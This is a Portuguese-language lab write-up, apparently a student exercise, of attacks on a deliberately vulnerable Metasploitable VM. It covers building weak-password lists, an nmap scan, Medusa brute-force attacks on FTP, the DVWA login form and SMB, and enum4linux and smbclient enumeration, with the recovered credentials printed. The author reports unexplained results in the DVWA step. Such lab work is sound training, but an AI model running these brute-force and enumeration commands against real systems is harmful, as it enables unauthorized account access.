# 🧪 Análise das Atividades Realizadas

## 📁 1. Criação das Wordlists

### 🔹 Comando

```bash
echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
```

### 🔹 Resultado

Arquivo `users.txt` criado contendo usuários comuns:

* user
* msfadmin
* admin
* root

---

### 🔹 Comando

```bash
echo -e "123456\npassword\nqwerty\nmsfadmin" > passwords.txt
```

### 🔹 Resultado

Arquivo `passwords.txt` criado com senhas fracas e comuns:

* 123456
* password
* qwerty
* msfadmin

---

## 🌐 2. Enumeração de Serviços com Nmap

### 🔹 Comando

```bash
nmap -sV -p- 192.168.56.101
```

### 🔹 Resultado

Serviços identificados:

* FTP → porta 21 (vsftpd 2.3.4)
* SSH → porta 22
* HTTP → porta 80 (Apache)
* SMB → portas 139 e 445 (Samba)

### 🔹 Resultado:

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2026-04-14 14:41 -03
Nmap scan report for 192.168.56.101
Host is up (0.00021s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 08:00:27:43:99:B8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.57 seconds
```

- 🎯 Conclusão: O alvo possui múltiplos vetores de ataque disponíveis.

---

## 🔐 3. Ataque ao Serviço FTP com Medusa

### 🔹 Comando

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 6 | grep "SUCCESS"
```

### 🔹 Resultado

```text
ACCOUNT FOUND: User: msfadmin Password: msfadmin
```

Bash: 
```bash
2026-04-14 14:52:21 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]
```

- ✅ Credencial válida encontrada:

* Usuário: `msfadmin`
* Senha: `msfadmin`

---

## 📂 4. Acesso ao FTP

### 🔹 Comando

```bash
ftp 192.168.56.101
```

### 🔹 Resultado
```bash
└─$ ftp 192.168.56.101
Connected to 192.168.56.101.220 (vsFTPd 2.3.4)
Name (192.168.56.101:john): msfadmin
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

```text
Login successful.
Remote system type is UNIX.
```

- ✅ Acesso concedido com sucesso ao servidor FTP utilizando:

---

## 🌍 5. Teste de Resposta do Formulário (DVWA)

### 🔹 Comando

```bash
curl -s -c cookies.txt http://192.168.56.101/dvwa/login.php > /dev/null && \
curl -s -b cookies.txt -c cookies.txt -X POST \
http://192.168.56.101/dvwa/login.php \
-d "username=invalido&password=invalido&Login=Login" -L | \
grep -i "login\|failed\|incorrect\|wrong\|invalid\|welcome\|logout"
```

### 🔹 Resultado

Identificação de padrões de resposta do sistema:

* "login"
* "failed"
* "incorrect"
* "welcome"

- 🎯 Conclusão: Foi possível identificar a string de falha necessária para o ataque automatizado.

---

## 🌐 6. Ataque ao Formulário HTTP (DVWA) com Medusa

### 🔹 Comando

```bash
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m 'FAIL=Login failed' -t 6
```

### 🔹 Resultado

Diversas credenciais válidas foram encontradas. Aqui o Medusa aparentou ter algum erro, ainda irei investigar o que pode ter acontecido.


> ⚠️ Observação crítica:
> O sistema aceita múltiplas combinações de credenciais fracas. 

O correto será : ***admin / password***

---

## 🕸️ 7. Enumeração com enum4linux

### 🔹 Comando

```bash
enum4linux -a 192.168.56.101 | tee enum_output.txt
```

### 🔹 Resultado

### 🔍 Informações obtidas:

* Workgroup: `WORKGROUP`
* Sistema: Linux (Samba 3.0.20)
* Sessões nulas permitidas (sem autenticação)

---

### 👥 Usuários identificados:

```less
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Tue Apr 14 15:45:07 2026

user:[games] rid:[0x3f2]
user:[nobody] rid:[0x1f5]
user:[bind] rid:[0x4ba]
user:[proxy] rid:[0x402]
user:[syslog] rid:[0x4b4]
user:[user] rid:[0xbba]
user:[www-data] rid:[0x42a]
user:[root] rid:[0x3e8]
user:[news] rid:[0x3fa]
user:[postgres] rid:[0x4c0]
user:[bin] rid:[0x3ec]
user:[mail] rid:[0x3f8]
user:[distccd] rid:[0x4c6]
user:[proftpd] rid:[0x4ca]
user:[dhcp] rid:[0x4b2]
user:[daemon] rid:[0x3ea]
user:[sshd] rid:[0x4b8]
user:[man] rid:[0x3f4]
user:[lp] rid:[0x3f6]
user:[mysql] rid:[0x4c2]
user:[gnats] rid:[0x43a]
user:[libuuid] rid:[0x4b0]
user:[backup] rid:[0x42c]
user:[msfadmin] rid:[0xbb8]
user:[telnetd] rid:[0x4c8]
user:[sys] rid:[0x3ee]
user:[klog] rid:[0x4b6]
user:[postfix] rid:[0x4bc]
user:[service] rid:[0xbbc]
user:[list] rid:[0x434]
user:[irc] rid:[0x436]
user:[ftp] rid:[0x4be]
user:[tomcat55] rid:[0x4c4]
user:[sync] rid:[0x3f0]
user:[uucp] rid:[0x3fc]
```

---

### 📂 Compartilhamentos SMB:

* `tmp` → acessível
* `opt` → restrito
* `ADMIN$` → restrito

---

### 🔐 Política de senha:

* Tamanho mínimo: **0**
* Complexidade: **desabilitada**

> ⚠️ Conclusão: Ambiente extremamente vulnerável a ataques de força bruta.

---

## 📁 8. Criação de novas Wordlists

### 🔹 Comando

```bash
echo -e "user\nmsfadmin\naservice" > smb_users.txt
```

### 🔹 Resultado

Arquivo `smb_users.txt` criado contendo usuários comuns:

* user
* msfadmin
* service

---

### 🔹 Comando

```bash
echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
```

### 🔹 Resultado

Arquivo `senhas_spray.txt` criado com senhas fracas e comuns:

* password
* 123456
* Welcome123
* msfadmin

---

## 🔐 9. Ataque ao SMB com Medusa

### 🔹 Comando

```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
```

### 🔹 Resultado

```text
ACCOUNT FOUND: User: msfadmin Password: msfadmin [ADMIN$ - Access Allowed]
```

- ✅ Credencial válida encontrada: ***msfadmin / msfadmin***

---

## 📂 10. Enumeração de Compartilhamentos SMB

### 🔹 Comando

```bash
smbclient -L //192.168.56.101 -U msfadmin
```

### 🔹 Resultado

```text
Password for [WORKGROUP\msfadmin]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      oh noes!
        opt             Disk      
        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
        msfadmin        Disk      Home Directories

Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            METASPLOITABLE
```
- 🎯 Acesso ao diretório pessoal do usuário `msfadmin`.

---

*Organizado por [João Victor Labre/LabreCoder](https://github.com/LabreCoder)*